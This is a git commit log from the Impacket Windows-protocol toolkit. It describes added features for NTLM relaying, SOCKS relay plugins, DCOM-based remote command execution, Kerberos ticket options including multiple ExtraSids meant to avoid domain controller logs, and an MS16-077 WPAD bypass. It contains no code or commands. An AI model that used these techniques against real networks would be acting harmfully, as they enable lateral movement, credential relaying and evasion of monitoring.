Author: asolino <bethus@gmail.com>
Date:   Tue Apr 3 17:03:15 2018 -0300

    Forgot to enable a missing test_case

commit 8e580a4bf2e8e3c4600107332b98be66a101184d
Author: asolino <bethus@gmail.com>
Date:   Tue Apr 3 16:36:38 2018 -0300

    Adding [MS-BKRP] Interface implementation + test cases
    
    * Most of the use cases working (e.g. wrapping and unwrapping server-side).
    * Left ToDo is 2.2.2 Client-Side-Wrapped Secret

commit 824b57f69821ba8409d9292e2b413427d2ccb0a0
Author: TheNaterz <nate.caroe@risksense.com>
Date:   Tue Apr 3 11:18:47 2018 -0600

    added bootkey option

commit 27dc1c93dced27173ef11285da2222f81b6f018f
Author: Matan Hart <me@matanhart.com>
Date:   Tue Apr 3 18:36:51 2018 +0300

    Added support for multiple ExtraSids
    
    Hola @asolino!
    I added an option to provide multiple SIDs to be included in the `ExtraSid` field inside the PAC.
    This addition is important to avoid some DC logs (well summarized by @HarmJ0y here - http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/).

commit c2697fdfe33c8fbb7c58f0826844a89e7b7bca39
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Sun Apr 1 09:49:52 2018 +0300

    Update dhcpm.py

commit 6464c143bf0093754a042e04c8fbe7eb488fae5f
Merge: f351c872 7dce6f22
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Mar 29 19:37:23 2018 -0300

    Merge pull request #416 from fox-it/ldaprelayclientfix
    
    Detect LDAP relay errors due to signing and display those

commit 7dce6f2237ec08fe1f287c7cded6e856350ae6cd
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Mar 29 17:43:46 2018 +0200

    Detect LDAP relay errors due to signing and display those

commit 97f4367e05d0d1ac2fb07b6170b6ecd4ce202f77
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Thu Mar 29 18:20:09 2018 +0300

    Added some dhcpsrv2 function implementation and bug fix
    
    Hi,
    I added implementations for some more functions in dhcpsrv2 interface (such as DhcpEnumSubnetElementsV5,  DhcpEnumSubnetClientsV5 and DhcpGetOptionValueV5).
    Plus there was a bug DHCP_ALL_OPTION_VALUES was declared twice for different objects, so I changed one of them to DHCP_ALL_OPTIONS_VALUES.

commit f351c87244643879521a829c7d49a670bddf3530
Merge: 0d1034c8 079b9572
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 16 10:55:12 2018 -0300

    Merge branch 'luzpaz-misc-typos'

commit 079b9572dc05ef62f7cc0a9986b8823cc4c5e61b
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 16 10:54:55 2018 -0300

    Fix typo

commit 9e7d88b74cacfdcbdc78b5a7191e87e6d01c4483
Author: luz.paz <luzpaz@users.noreply.github.com>
Date:   Fri Mar 16 09:43:26 2018 -0400

    source typo fix

commit 0e96b60b92feed0ac7a85c560e9fa8af0da20e33
Author: luz.paz <luzpaz@users.noreply.github.com>
Date:   Fri Mar 16 09:42:21 2018 -0400

    Misc. typos
    
    Found via `codespell -q 3 -I ../impacket-word-whitelist.txt` through downstream `curl`

commit 0d1034c8c710af9d0b4cad0af92a2a47bcdf9d77
Merge: d88c0f38 7541eed0
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 12 11:04:10 2018 -0300

    Merge pull request #408 from xambroz/unshabang
    
    Removing unnecessary shabangs

commit d88c0f3816198126fe62ba8c74020b2c3d4f918a
Merge: e0af5bbf c39c942a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 12 10:59:53 2018 -0300

    Merge pull request #405 from xambroz/os_ident
    
    Moving os_ident to impacket.examples

commit 7541eed045eb5e7930f4f4d494c5b6baef91e5c0
Author: Michal Ambroz <xambroz@users.noreply.github.com>
Date:   Sun Mar 11 17:29:11 2018 +0100

    Removing unnecessary shabangs for scripts which are meant to be modules
    for including, but not for direct execution.

commit c39c942a51e542ff83449c0a9abbd70673c0d376
Author: Michal Ambroz <xambroz@users.noreply.github.com>
Date:   Sun Mar 11 12:57:54 2018 +0100

    Moving os_ident to impacket.examples

commit e0af5bbf8d2ccd7c011d01ed112d6824a6161e93
Merge: 06d29f26 ae24770c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Mar 8 17:03:25 2018 -0300

    Merge pull request #402 from CoreSecurity/byt3bl33d3r-shellbrowserexec
    
    Byt3bl33d3r shellbrowserexec -> dcomexec.py

commit ae24770c5ae949561bce8736ae4ab8b59e505a67
Author: asolino <bethus@gmail.com>
Date:   Thu Mar 8 16:57:57 2018 -0300

    Minor change in description

commit bb741908eeba9c9001cb4d3c7f0c095fad184b89
Author: asolino <bethus@gmail.com>
Date:   Thu Mar 8 16:56:27 2018 -0300

    Deprecated. Replaced by dcomexec.py -object MMC20

commit 06d29f263d603adf302c163f0e4fb68ae4cd6fdb
Author: asolino <bethus@gmail.com>
Date:   Wed Mar 7 19:14:19 2018 -0300

    Reliability improvements in IMAP/IMAPS socks proxy
    
    * Sending and received mails (proxying IMAP/SMTP) seems to work most of the times
    * Still some situations when the relay connection is lost (we don't want that), for example when
    proxying IMAPS/STMP, sending an email, send quitting thunderbird, then restarting. More research needed

commit 750b7b8945ceedab98e9e61bb1f0f70bfd39c571
Author: asolino <bethus@gmail.com>
Date:   Wed Mar 7 11:52:26 2018 -0300

    Bumping dev release to 0.9.17-dev. There won't be a 0.9.16 release.
    
    * Given the change in the installation process, it is better to have a new version dev version just to be
    sure impacket is installed with the latest bits.

commit 882caa046809fe269edf3a0031ed359d6767df7a
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 6 16:54:13 2018 -0300

    Renamed and joined with mmcexec.py, now called dcomexec.py
    
    A similar approach to psexec but executing commands through DCOM.
    You can select different objects to be used to execute the commands.
    Currently supported objects are:
       1. MMC20.Application (49B2791A-B1AE-4C90-9B8E-E860BA07F889) - Tested Windows 7, Windows 10, Server 2012R2
       2. ShellWindows (9BA05972-F6A8-11CF-A442-00A0C90A8F39) - Tested Windows 7, Windows 10, Server 2012R2
       3. ShellBrowserWindow (C08AFD90-F2A1-11D1-8455-00A0C91F3880) - Tested Windows 10, Server 2012R2
    
    Drawback is it needs DCOM, hence, I have to be able to access DCOM ports at the target machine.
    
    Original discovery by Matt Nelson (@enigma0x3):
    https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
    https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/

commit 3aa8fdcab157cefb214fe1c9c1cade13822e49d3
Merge: f0960ee0 223001aa
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 6 12:27:24 2018 -0300

    Merge branch 'shellbrowserexec' of https://github.com/byt3bl33d3r/impacket into byt3bl33d3r-shellbrowserexec

commit f0960ee064eb27bf4b87445979dcabdb0a48d87c
Author: asolino <bethus@gmail.com>
Date:   Sun Mar 4 12:12:10 2018 -0300

    Reliability fixes
    
    1. Remove active socks relay if 'Invalid argument' exception is raised
    2. httprelayserver: if protocol client is not found, abort
    3. smtp/imap relay clients: if keep alive fails, remove it from the relay list, don't catch the exception

commit 223001aad01b5a2dccd0a14c46356abe2d373a68
Author: byt3bl33d3r <byt3bl33d3r@protonmail.com>
Date:   Fri Mar 2 22:22:20 2018 -0700

    Derp2

commit 9bc07957efe8e366e15250d69ea012f4acad45b3
Author: byt3bl33d3r <byt3bl33d3r@protonmail.com>
Date:   Fri Mar 2 22:17:06 2018 -0700

    Derp

commit cb6e114698e89617dbe0053264a825a74c5044d3
Author: byt3bl33d3r <byt3bl33d3r@protonmail.com>
Date:   Fri Mar 2 22:13:51 2018 -0700

    Added shellbrowserexec example script

commit 8efbc8ede5404ebbc53082a25c0d398398161198
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 2 09:53:57 2018 -0300

    Fixed uninitialized variable exception + traceback print when debug is enabled

commit 068279993b19776ec4cf5b93742f469b1f4025c2
Merge: 511faea9 488e6a1f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Mar 1 09:45:42 2018 -0300

    Merge pull request #399 from bao7uo/master
    
    minor typos

commit 488e6a1f0bbb9e51add5d40e8a06331c893592d3
Author: Paul Taylor <21125224+bao7uo@users.noreply.github.com>
Date:   Wed Feb 28 22:39:15 2018 +0000

    minor typos

commit 511faea94881264fdfa650559858995a934ac283
Merge: a637daba db302a70
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Feb 28 18:56:32 2018 -0300

    Merge pull request #398 from fox-it/relayfixes
    
    Small fixes in ntlmrelayx LDAP relaying

commit a637dabac1d05434cb42b85ba97587e2821473d3
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 28 18:54:41 2018 -0300

    Adjusting install packages and information, including packages needed for examples

commit db302a70ff31d54e2e3a2664119efc28b99b79be
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Feb 28 22:44:24 2018 +0100

    Small fixes in ntlmrelayx LDAP relaying

commit 541706ac39dbee1f99d57b3bf93baf4918e9582a
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 28 17:50:48 2018 -0300

    We don't need to load the plugins until we know we have all the args right

commit d0c357e8f8c00ebbf40935775924dd6862dd124f
Merge: 7ca67ee1 cbb79142
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Feb 28 17:45:34 2018 -0300

    Merge pull request #397 from CoreSecurity/relay-experimental
    
    Relay experimental

commit cbb791427eaec0a20cf6ce0949d0dcf07adf1d8c
Merge: 8cfdf014 7ca67ee1
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Feb 27 18:05:15 2018 -0300

    Merge branch 'master' into relay-experimental

commit 7ca67ee18bac23729f07325567a9a6fd34007fac
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 20 19:38:49 2018 -0300

    Get getMachineName() now works even if anonymous login is not allowed
    
    We have enough data already to get the server's name

commit d2c9b366483ba71d83d2bc1dfd75727dd2644356
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 20 19:36:03 2018 -0300

    Trying to increase the likelihood of getting RC4 session tickets.
    
    In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
    password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
    cleartext password.
    If no clear text password is provided, we just go with the defaults.

commit d8698c0c92f383b7fe7a51c095c28aabdca28579
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 13 16:13:15 2018 -0300

    pip packaging dep autoinstall
    
    * Based on @maaaaz feedback.
    * Addresses https://github.com/CoreSecurity/impacket/issues/337

commit f99b53b4512a05a420855e00a082343afb3f8b00
Merge: 1c4b3834 523f7d99
Author: asolino <bethus@gmail.com>
Date:   Sat Feb 10 18:10:00 2018 -0300

    Merge branch 'eyalmamo-fix_nmb_send_bug'

commit 523f7d999b0f36248225a35f943ba1dc01948e36
Author: asolino <bethus@gmail.com>
Date:   Sat Feb 10 18:09:42 2018 -0300

    Replace socket.send() with socket.sendall()

commit d9e316ae89fb20bf092175aec05514ecb6f9ae6a
Merge: 1c4b3834 be0117ab
Author: asolino <bethus@gmail.com>
Date:   Sat Feb 10 17:55:52 2018 -0300

    Merge branch 'fix_nmb_send_bug' of https://github.com/eyalmamo/impacket into eyalmamo-fix_nmb_send_bug

commit 8cfdf014995b8c1a5395f80f1132fdeab49d1311
Merge: 45abb5b5 52564c77
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Feb 9 10:44:50 2018 -0300

    Merge pull request #392 from mohemiv/relay-experimental
    
    Fixed decoding "Chunked transfer encoding"

commit 52564c77666803066f6c6c253e0df3c202be0f8b
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Feb 8 20:33:39 2018 +0300

    Fixed decoding "Chunked transfer encoding"

commit 1c4b38349dca2cf9ff510c4ec425a2ed71a7d4eb
Merge: 4ab9bb1e f2307d25
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Feb 8 09:43:05 2018 -0300

    Merge pull request #391 from donwayo/wmiexec_failures
    
    Wmiexec failures

commit f2307d25781b0abf9160aa5feffbf46c36cb502d
Merge: 541fe407 4ab9bb1e
Author: Donwayo <guayin@gmail.com>
Date:   Thu Feb 8 13:30:44 2018 +0100

    Merge branch 'master' of https://github.com/CoreSecurity/impacket into wmiexec_failures

commit 541fe4072c8825512914d57bf71d5921559d20d0
Author: Donwayo <guayin@gmail.com>
Date:   Thu Feb 8 13:26:51 2018 +0100

    Fixed crash when wmiexec.py fails to get a file.

commit 4ab9bb1edd83de6fedce36619f265ac0e6b178f5
Merge: 84ad443a ff03fbfd
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Feb 6 18:12:27 2018 -0300

    Merge pull request #388 from Kayzaks/master
    
    Alternative method to execute cmd's on MSSQL

commit ff03fbfd25330f9dd043bade11627a9fec3e2e0c
Author: Michael Kissner <m1o1d1@gmail.com>
Date:   Tue Feb 6 20:37:07 2018 +0100

    Job set to always delete

commit 84335395b7550fa23d1c7790308454e8ecfafa5d
Author: Michael Kissner <m1o1d1@gmail.com>
Date:   Tue Feb 6 20:20:38 2018 +0100

    Added alternative method to execute cmd's on MSSQL

commit 84ad443a0e227f4c99481effe3041281deeeebce
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 6 12:00:16 2018 -0300

    Adding CIM_ARRAY_OBJECT support when using WMI.
    
    * Now CIM_ARRAY_OBJECTs are parsed and for each item a IWbemClassObject is created
    * Fix in printInformation() so it prints better output and less noise
    * Check #387 for usage

commit b1a8bd84e3ba952406c4e21fdb80bd4a53f096dc
Author: asolino <bethus@gmail.com>
Date:   Mon Feb 5 18:34:37 2018 -0300

    First pass for CIM_TYPE_OBJECT support when using WMI.
    
    * Check https://github.com/CoreSecurity/impacket/issues/387 for usage

commit 28ebe5c296acace3cdd6dec0b9acd53d9c0a56d1
Author: asolino <bethus@gmail.com>
Date:   Mon Feb 5 13:26:28 2018 -0300

    Print traceback if DEBUG is on

commit ec9bab2fad83216f18556486c38a513951c4d666
Merge: 3ea914bd 08fc7378
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Feb 1 09:33:36 2018 -0300

    Merge pull request #384 from derekchentrendmicro/fix_unicode_struct
    
    fix UnicodeStructure of class SMBOpen_Data

commit 08fc737864a7dc1b9446752c1764b5bcb143843a
Author: derekchentrendmicro <derek_chen@trend.com.tw>
Date:   Thu Feb 1 10:46:18 2018 +0800

    fix UnicodeStructure of class SMBOpen_Data
    
    1. 'FileName' should be Unicode. Change 'z' to 'u'.
    2. openFile['Data']['Pad'] is not processed so remove it.

commit 45abb5b5bd1a67e77c58596a5314bf04e78db7f8
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 31 17:07:26 2018 -0300

    Using the SMTPException Exception to catch SMTP keepAlive() errors

commit 80b8e4ad837d99ea711188c2551a79f99c19aa94
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 31 17:00:09 2018 -0300

    keepAlive() refactoring
    
    * Moved from SOCKS plugins to protocolClient
    * The timer is called every impacket.examples.ntlmrelayx.servers.socksserver.KEEP_ALIVE_TIMER seconds
    * The protocolClient.keepAlive() method will be called, and it's up to the method to decide whether or not it is time to send a keep alive to the target. Check the SMB protocolClient for an example.

commit 9f3c6e125ef7c763b894edb6cbd1b0875fb9fc25
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 31 15:28:34 2018 -0300

    Relay servers are now attacks agnostic
    
    * These servers don't handle specifics about the attacks.. it just forwards connections to the available attacks based on a predefined dictionary.
    * In the future we can implement the attacks as plugins similar to the protocolClients/socks plugins.
    * Keep in mind this when coding more servers
    * Testing needed

commit b68c66577d79e1909500672fdb214d28034ac52a
Merge: 95ba1bf6 54b5277d
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jan 31 14:07:01 2018 -0300

    Merge pull request #383 from fox-it/relay-experimental
    
    Compatibility with ldap3==2.4.1, small bugfix in WPAD parsing and requirements updates

commit 54b5277d592895832d6f055179b15c0a617ac70b
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 31 17:12:17 2018 +0100

    Updated requirements and split requirements into library requirements and requirements for the examples

commit c871150e944c143481cc965c822f2c0f82e22cc4
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 31 15:52:43 2018 +0100

    Compatibility with ldap3==2.4.1, small bugfix in WPAD parsing

commit 95ba1bf68f9de5c3818881a92ac94e25b21b4e11
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 30 19:40:57 2018 -0300

    Passing the protocolClient instance to activeConnections Queue (instead of protocolClient.session)
    
    - Needed because we not only need the session itself (for relaying connections) but also the protocolClient that has the killConnection() method. Needed to kill the relayed connection when needed. Why?.. Because depending on the protocolClient session, there might be different methods to call in order to close the client session.
    - This solves this pending ToDo https://github.com/CoreSecurity/impacket/blob/relay-experimental/impacket/examples/ntlmrelayx/servers/socksserver.py#L221 that was preventing the socks server to behave independently of the protocolClient used.

commit 3ea914bde68f473bf94f43d2345f08d383bd71fc
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 25 11:23:55 2018 -0300

    We need to take out the domain (if provided) when building the SPN

commit c61fbb8d6b4f346751777a0d990dfe972a12d6d6
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 25 10:49:08 2018 -0300

    Fixed wrong sname construction

commit 414ef00a2f2431d22e0a8042a7911d94fee92a5e
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 25 10:47:11 2018 -0300

    Fixed Kerberos Principal creation when FQDN is specified as command line

commit aa493da013f8ed993985b46610c90220a7fd68d4
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 25 10:12:44 2018 -0300

    Improved test cases
    
    * Should work better against 2012 DCs

commit 4de5171c062a1c3a0355360d70c9c05138d5680d
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 24 19:00:55 2018 -0300

    When anySPN is True, return a suitable TGT/ST *without* checking the SPN's port number

commit 7de02244bf4c8c4beaf24a321b6529f759a0ae25
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 23 18:20:30 2018 -0300

    Added the Authenticated attribute inside the connection ID
    
    * It should kick users' off if they try to execute commands that are not allowed if you're not authenticated
    * Authentication (including signing) should now work for SMB1/SMB2

commit fffb62114699c22b12a3b3446665cac978e16371
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 22 16:48:49 2018 -0300

    Added a last check for ccache Session Tickets lookup
    
    - If no ST was found, we look for the instance name based on the destination port, and we try the SPN with the instance name.
    - Thanks @bransh for the updates.

commit 46dfdcf680e356d5bff92f7712941b26532b54d2
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 22 12:34:06 2018 -0300

    Adding domain to the principal name when search for a service ticket in the cache

commit 58c2aecfad1c6eac6deda0061c139c5f54d60b57
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 20 18:28:01 2018 -0300

    Copyright updated

commit f6db45b2bb9218b041fd85c0af8cec5eb1977b44
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 20 18:21:07 2018 -0300

    Printing domain SID when running
    
    * Useful for other tools (e.g. ticketer.py)

commit 811d715525494f017bf0e858ceba93fe085c622c
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 20 18:10:20 2018 -0300

    We want the server to include the target port as well
    
    * Important when writing service tickets that needs the port specified (e.g. MSSQLSvc)

commit 0c9332f84099f7bfb7ac6e613f18a52ff709af22
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 20 17:58:26 2018 -0300

    Extra verification to check whether or not we have a TGT/TGS available in cache

commit 7ed3fdcf05e629902e61956de080d95b16926891
Merge: 5813a5f4 cf84ee5e
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 20 16:52:01 2018 -0300

    Merge branch 'machosec-patch-5'

commit cf84ee5e4d1382bd765c78b6dd9a0ed3186b9d72
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 20 16:50:12 2018 -0300

    ASN1 encoding errors fixed
    
    * Fixes by @bransh / @br4nsh. Now everything seems to be working

commit 87cebb4b07e8844e78e1c9ace335ca34630583af
Merge: 5813a5f4 f3745471
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 20 16:38:15 2018 -0300

    Merge branch 'patch-5' of https://github.com/machosec/impacket into machosec-patch-5

commit 5813a5f4527460b9c9b87175f528d5d366e0436b
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 18 09:12:10 2018 -0300

    __str__ should return the encoded blob, not its length
    
    * Fixes https://github.com/CoreSecurity/impacket/issues/376

commit 5c1d9945c1eee0d0d23fb7d5512ff7821633d1ff
Merge: d57af783 3ba1a36e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jan 16 10:26:33 2018 -0300

    Merge pull request #374 from arch4ngel/smbserver_interface_specification
    
    patching smbserver.py for ip specification

commit 3ba1a36e39cc1f07e4f4d3063fc53f5d85bd55b7
Author: arch4ngel <justinangel86@gmail.com>
Date:   Mon Jan 15 20:48:49 2018 -0500

    patching smbserver.py for ip specification

commit 9386c590be76b1ec7584c8132e334170a043611e
Merge: 3278ee41 fd9196b0
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 12 12:31:14 2018 -0300

    Merge branch 'mohemiv-relay-experimental' into relay-experimental

commit fd9196b0d3925eb0a520658ccb0bc1d69d7b154b
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jan 12 11:59:58 2018 +0300

    Added SOCKS4a support

commit d57af7835f9f3192988d1c99d9a1b549000cf37e
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 11 10:09:07 2018 -0300

    Happy new year

commit 3278ee4147353f6c2b0b3d733ccea477da842f65
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 11 10:08:32 2018 -0300

    Happy new year

commit e64336cb697bd22a24badbe06ee3dd1a06f72319
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 11 09:16:39 2018 -0300

    Properly decode AUTHENTICATE_MESSAGE contents based on the encoding set
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/368

commit c4e48bf3168aef2b8922c58cc979e65c294bbd0d
Merge: f8830bfa cc4b5e45
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jan 10 19:10:27 2018 -0300

    Merge pull request #370 from fox-it/mitm6-re
    
    IPv6 compatibility and WPAD serving for MS16-077 bypass

commit b6a604442c5c2091b4963ea687ce71afdcc28d76
Merge: 093f8856 d347ffa6
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jan 10 18:11:55 2018 -0300

    Merge pull request #369 from fox-it/mitm6-m
    
    IPv6 compatibility and WPAD serving for MS16-077 bypass

commit d347ffa6eb83a47af259ad1ce9ac11014e92e0fd
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 10 21:46:52 2018 +0100

    IPv6 compatibility and WPAD serving for MS16-077 bypass

commit cc4b5e457516f7f1487c6d15bc655ebd3fe15202
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 10 21:12:20 2018 +0100

    IPv6 compatibility and WPAD serving for MS16-077 bypass

commit f8830bfae2478baffc414870392b8edbd8cfb24e
Merge: 4fd786dc 5b878691
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 9 20:46:47 2018 -0300

    Merge branch 'fox-it-relay-experimental' into relay-experimental

commit 5b8786915c9a078b786fb65066d297f2f3be37d6
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 9 20:41:26 2018 -0300

    LOG must be used only inside the library files.
    
    * Examples should use logging directly.

commit 093f8856c4914ac661bfbae803fd1a7b0d335e9e
Merge: cf03ace5 47a3b9fd
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 9 20:35:40 2018 -0300

    Merge branch 'Ramzeth-master'

commit 47a3b9fd19e4823ca3b9cab4612a9e7a3f46a970
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 9 20:35:06 2018 -0300

    Adding debug info for LSA and preventing exception when OldVal not present

commit 4d1b432ae42f2076aa3231251137cd70d3ad2e4b
Merge: cf03ace5 d2736eff
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 9 20:15:46 2018 -0300

    Merge branch 'master' of https://github.com/Ramzeth/impacket into Ramzeth-master

commit cf03ace5e70d77d395a1b6b189222036ac379230
Merge: b579cfc6 90c9908a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jan 9 20:14:09 2018 -0300

    Merge pull request #367 from arch4ngel/ntlmrelayx_interface_specification
    
    Update ntlmrelayx to support IP address specification

commit 90c9908a861ee958d07d4ed478821cf0f2475a11
Author: root <root@fuzzjessiex64>
Date:   Mon Jan 8 12:03:44 2018 -0500

    Initial configuration to support specification of interface addresses when using ntlmrelayx.py

commit b579cfc6e1ddca43f64c0adb1e434d1006cc612b
Author: asolino <bethus@gmail.com>
Date:   Sun Jan 7 20:39:40 2018 -0300

    Adding support for user/password authentication
    
    * Just call using -user <username> -password <password> (optionally just provide the LM:NT hashes)
    * Signing will be enabled when needed
    * SMBv1/v2 support

commit 0227d6a9550c951961ce611a8ea77a51cf8cbe48
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Fri Jan 5 15:10:52 2018 +0100

    Fixed high CPU by removing redundant loop in connectionwatcher

commit fc92ac3c337cba6ab61d6814abb8a1ae67e2d9d7
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Jan 4 16:09:24 2018 +0100

    HTTP socks server and target selection improvements

commit da4ebe497391e0dddbc9ec3d9f1afdee087300ef
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Jan 4 15:43:50 2018 +0100

    Added hostname support for SOCKSv5 in socksserver

commit 09f55649b7ee78bd8c6d182e17e985fd887ee6c3
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 3 15:36:16 2018 +0100

    Added SMTP relaying to ntlmrelayx (SOCKS only)

commit 099769996415a63629d56e43326e214d31760071
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 3 15:35:12 2018 +0100

    IMAP SOCKS plugin fixes

commit 57c13382bb6a941fc33aa9e665129d6d4ae21dd1
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 3 11:25:04 2018 +0100

    Added IMAPS SOCKS client

commit 32b50dfbfa6a2bfbdd98b9f0dbaa95d200e9b6bc
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 3 11:24:41 2018 +0100

    Small bugfixes in HTTP(s) SOCKS clients

commit aa22d3640d2b95106a831cd0741c809203fba9e1
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Jan 2 17:56:50 2018 +0100

    Added generic SSL socks wrapper and HTTPS socks relay

commit 8dc9a0cfce2f90102a814846b3d99cceab2ee71a
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Jan 2 17:52:39 2018 +0100

    Fix default port for HTTPS relaying

commit cb12116b293d7a3441fcc0cd2f50631ad17fda7b
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Fri Dec 29 10:53:47 2017 +0100

    Added Protocol to relays table

commit 42aff58cb9e5ad288e9e9e9f01388172d1e4f013
Author: Dirk-jan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Dec 27 13:22:25 2017 -0800

    Small fixes + catch exceptions in sockserver for cleanup

commit 03638274731e1e0caea84139a6114a1ebbb2ef32
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Dec 27 17:35:54 2017 +0100

    Socks plugin for IMAP relaying

commit cf6618e1c3d5142c8612a4454044a2777b0d7d95
Author: Dirk-jan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Dec 25 13:15:01 2017 -0800

    Added HTTP socks module

commit 2e9d4d9e9579a211b219f02572bbfda492f79814
Author: Dirk-jan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Dec 25 13:11:51 2017 -0800

    Small logging fixes for submodules debugging

commit eab6f6f37fde0e47c7b52e2c1bb81311a3246ec0
Author: Dirk-jan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Dec 25 09:49:41 2017 -0800

    Added SOCKS plugin autodetection in relay servers

commit 108cac3e3103ac3095f2c14eed98182dde6034f4
Author: Dirk-jan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Dec 25 09:17:45 2017 -0800

    Small bug and spelling fix

commit 4fd786dce29635ba72c08bf027b7c5d6f9891972
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 21 19:21:15 2017 -0300

    Seetting threading daemon for SocketServer in SOCKS and better LOG messages

commit a5224b2e7a6c20bc7bb22daa74ef30ddf81677c7
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 21 18:36:51 2017 -0300

    Avoid using PROXY for SOCKS server connection and TargetUtils support for single IP address
    
    - It will convert it to smb://<targetIP>

commit 86537dfff730ea8f6dcddd59a3e9f0bc2e9a1663
Merge: c166e271 ce2571f3
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Dec 21 15:27:23 2017 -0500

    Merge pull request #360 from fox-it/relay-experimental
    
    Bugfixes in relay clients, fixed ldap relaying, fixed threading serve…

commit c166e271208ab24ec516dc63b6a994cd8118ba05
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 21 16:15:11 2017 -0300

    Standard security support added

commit ce2571f39833403bfb58f25303be89e606893cb5
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Dec 20 17:05:01 2017 +0100

    Bugfixes in relay clients, fixed ldap relaying, fixed threading servers for ctrl+c

commit 61c354db9863c175ac606333df5e5f8abea6eac5
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 19 10:52:22 2017 -0500

    Setting SMBSERVER to run as daemon

